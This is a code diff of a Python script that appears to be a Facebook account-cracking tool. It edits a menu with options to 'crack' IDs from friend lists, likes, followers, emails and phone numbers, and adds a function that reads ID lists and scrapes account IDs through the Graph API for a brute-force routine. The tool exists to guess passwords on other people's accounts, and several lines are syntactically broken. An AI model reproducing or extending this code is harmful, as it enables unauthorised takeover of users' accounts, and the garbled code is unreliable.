@@ -264,10 +264,12 @@ def menu():
     print((p+" ["+k+"•"+m+"•"+p+"]"+p+" Your Joined  : \033[1;33m"+durasi))
     print((p+"\n ["+o+"01"+p+"]"+h+" Crack ID From Public/Friendlist"))
     print((p+" ["+o+"02"+p+"]"+u+" Crack ID From Likes Post"))
-    print((p+" ["+o+"03"+p+"]"+p+" Crack ID From Followers"))
-    print((p+" ["+o+"04"+p+"]"+p+" Crack ID From File"))
+    print((p+" ["+o+"03"+p+"]"+p+" Crack ID From Followers"))    
+    print((p+" ["+o+"04"+p+"]"+m+" Crack Phone Number"))
     print((p+" ["+o+"05"+p+"]"+k+" Crack Email"))
-    print((p+" ["+o+"06+p+"]"+m+" Crack Phone Number")
+    print((p+" ["+o+"06"+p+"]"+p+" File Cloning"))
+    print((p+" ["+o+"07"+p+"]"+p+" Result Crack "))
+    print((p+" ["+o+"00"+p+"]"+p+" Logout "))
     choose_menu()
 
 def choose_menu():
@@ -282,18 +284,14 @@ def choose_menu():
 	elif r=="3" or r=="03":
 		follow()
 	elif r=="4" or r=="04":
-		try:
-	        idlist= raw_input('[+] File Name: ')
-	        for line in open(idlist ,'r').readlines():
-	            id.append(line.strip())
-	    except IOError:
-	         print"[!] File Not Found."
-	         raw_input('Press Enter To Back. ')
+		random_numbers()
 	elif r=="5" or r=="05":
-	        random_email()
-	elif r=="6" or r=="06:
-	        rom_numbers()
-	elif r=="0 or r=="00:
+		random_email()
+	elif r=="6" or r=="06":
+	        jam()
+	elif r=="7 or r=="07:
+		ress()
+	elif r=="0" or r=="00":
 		try:
 			os.system("rm -rf login.txt")
 			exit()
@@ -475,6 +473,29 @@ def random_email():
     {th.submit(brute, user['user'], user['pw']): user for user in data}
   input("\n\033[1;37m [BACK]")
   menu()
+
+def jam():
+	try:
+	        idt= raw_input('[+] File Name: ')
+	        for line in open(idt ,'r').readlines():
+	            id.append(line.strip())
+		except KeyError:
+			print((p+" ["+k+"•"+m+"•"+p+"] ID Not Found"))
+			print((p+"\n [BACK]"+p))
+			menu()
+		r=requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
+		id = []
+		z=json.loads(r.text)
+		qq = (op["first_name"]+".json").replace(" ","_")
+		ys = open(qq , "w")#.replace(" ","_")
+		for a in z["data"]:
+			id.append(a["id"]+"<=>"+a["name"])
+			ys.write(a["id"]+"<=>"+a["name"]+"\n")
+		ys.close()
+		print((p+" ["+k+"•"+m+"•"+p+"] Total ID : %s"%(len(id))))
+		return pilihcrack(qq)
+	except Exception as e:
+		exit(p+"\n ["+k+"•"+m+"•"+p+"] Error : %s"%e)
 
 def brute(user, passs):
   try:
